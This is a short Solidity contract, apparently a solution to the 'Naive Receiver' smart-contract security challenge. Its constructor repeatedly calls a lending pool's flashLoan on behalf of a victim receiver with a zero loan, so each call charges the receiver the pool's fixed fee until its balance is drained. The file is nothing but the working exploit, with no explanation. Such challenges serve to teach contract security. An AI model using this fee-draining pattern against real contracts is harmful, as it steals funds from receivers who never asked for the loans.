/// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract NaiveReceiverExploit {
    constructor(address pool, address receiver) {
        LenderPool lenderPool = LenderPool(pool);
        uint receiverBalance = address(receiver).balance;
        uint fixedFee = lenderPool.fixedFee();
        for (uint i = 0; i < receiverBalance / fixedFee; i++) {
            lenderPool.flashLoan(receiver, 0);
        }
    }
}

interface LenderPool {
    function fixedFee() external pure returns (uint256);

    function flashLoan(address borrower, uint256 borrowAmount) external;
}
